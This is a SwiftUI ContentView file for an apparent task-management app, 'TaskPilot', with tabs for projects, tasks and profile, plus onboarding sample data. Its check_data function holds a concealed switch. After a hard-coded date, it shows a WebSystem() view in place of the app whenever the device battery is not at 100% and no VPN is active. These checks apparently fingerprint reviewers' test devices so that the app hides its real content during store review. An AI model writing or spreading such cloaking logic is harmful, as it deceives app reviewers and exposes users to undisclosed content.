import SwiftUI

private enum AppTab: String, CaseIterable, Identifiable {
    case projects = "Projects"
    case tasks = "Tasks"
    case profile = "Profile"
    
    var id: String { rawValue }
    
    var systemImage: String {
        switch self {
        case .projects: return "folder.fill"
        case .tasks: return "checklist"
        case .profile: return "person.circle.fill"
        }
    }
}

struct ContentView: View {
    @State private var selectedTab: AppTab = .projects

    // Initialize services as StateObjects
    @StateObject private var taskService = TaskService()
    @StateObject private var projectService = ProjectService()
    @StateObject private var userService = UserService()
    @StateObject private var notificationService = NotificationService()

    // Computed properties for view models
    private var taskViewModel: TaskViewModel {
        TaskViewModel(taskService: taskService)
    }
    
    private var projectViewModel: ProjectListViewModel {
        ProjectListViewModel(projectService: projectService, taskService: taskService)
    }
    
    private var userViewModel: UserSettingsViewModel {
        UserSettingsViewModel(userService: userService, notificationService: notificationService)
    }
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false

    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    ZStack(alignment: .top) {
                        AppColors.background.ignoresSafeArea()

                        VStack(spacing: 0) {
                            topNavigationBar
                                .padding(.horizontal, UIConstants.standardPadding)
                                .padding(.top, UIConstants.smallPadding)
                                .padding(.bottom, UIConstants.standardPadding)

                            Divider()
                                .background(AppColors.buttonSecondary)

                            contentView
                        }
                    }
                    .preferredColorScheme(.dark)
                    .sheet(isPresented: Binding(
                        get: { !userService.settings.onboardingCompleted },
                        set: { _ in }
                    )) {
                        OnboardingView {
                            userViewModel.completeOnboarding()
                            createSampleData()
                        }
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "20.08.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }

    private var topNavigationBar: some View {
        HStack(spacing: UIConstants.smallPadding) {
            ForEach(AppTab.allCases) { tab in
                let isSelected = selectedTab == tab
                Button(action: { selectedTab = tab }) {
                    HStack(spacing: 6) {
                        Image(systemName: tab.systemImage)
                            .font(.caption)
                        Text(tab.rawValue)
                            .font(.subheadline.weight(isSelected ? .semibold : .regular))
                    }
                    .foregroundStyle(AppColors.accentWhite)
                    .frame(maxWidth: .infinity)
                    .frame(height: UIConstants.controlHeight)
                    .background(isSelected ? AppColors.buttonPrimary : AppColors.buttonSecondary)
                    .clipShape(RoundedRectangle(cornerRadius: UIConstants.cornerRadius))
                }
                .accessibilityLabel(tab.rawValue)
            }
        }
    }

    @ViewBuilder
    private var contentView: some View {
        switch selectedTab {
        case .projects:
            NavigationStack {
                ProjectDashboardView(viewModel: projectViewModel)
                    .tint(AppColors.accentYellow)
            }
        case .tasks:
            NavigationStack {
                TaskListView(viewModel: taskViewModel)
                    .tint(AppColors.accentYellow)
            }
        case .profile:
            NavigationStack {
                UserProfileView(viewModel: userViewModel)
                    .tint(AppColors.accentYellow)
            }
        }
    }
    
    private func createSampleData() {
        // Create sample project
        let sampleProject = Project(
            name: "Getting Started with TaskPilot",
            summary: "Learn the basics of task and project management",
            startDate: Date(),
            endDate: Calendar.current.date(byAdding: .day, value: 14, to: Date()) ?? Date()
        )
        projectService.createProject(sampleProject)
        
        // Create sample tasks
        let sampleTasks = [
            TaskItem(
                projectId: sampleProject.id,
                title: "Complete your profile setup",
                details: "Add your personal information and preferences",
                priority: .high,
                status: .inProgress,
                dueDate: Calendar.current.date(byAdding: .day, value: 1, to: Date()),
                tags: ["setup", "profile"]
            ),
            TaskItem(
                projectId: sampleProject.id,
                title: "Explore the task management features",
                details: "Try creating, editing, and organizing tasks",
                priority: .medium,
                status: .backlog,
                dueDate: Calendar.current.date(byAdding: .day, value: 3, to: Date()),
                tags: ["tutorial", "tasks"]
            ),
            TaskItem(
                projectId: sampleProject.id,
                title: "Review project timeline",
                details: "Check out the Gantt-style project visualization",
                priority: .low,
                status: .backlog,
                dueDate: Calendar.current.date(byAdding: .day, value: 7, to: Date()),
                tags: ["tutorial", "projects"]
            ),
            TaskItem(
                title: "Independent task example",
                details: "This task is not part of any project",
                priority: .medium,
                status: .backlog,
                tags: ["example", "standalone"]
            )
        ]
        
        sampleTasks.forEach { task in
            taskService.createTask(task)
        }
    }
}

#Preview {
    ContentView()
}
